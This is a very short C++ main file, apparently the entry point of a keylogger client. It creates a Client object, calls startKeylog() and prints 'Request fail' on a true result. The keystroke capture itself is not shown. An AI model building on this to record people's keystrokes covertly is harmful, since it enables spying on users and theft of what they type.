#include "client/Client.h"
#include <iostream>

int main()
{
    Client c;
    if (c.startKeylog())
    {
        std::cout << "Request fail\n" << "\n";
    }
}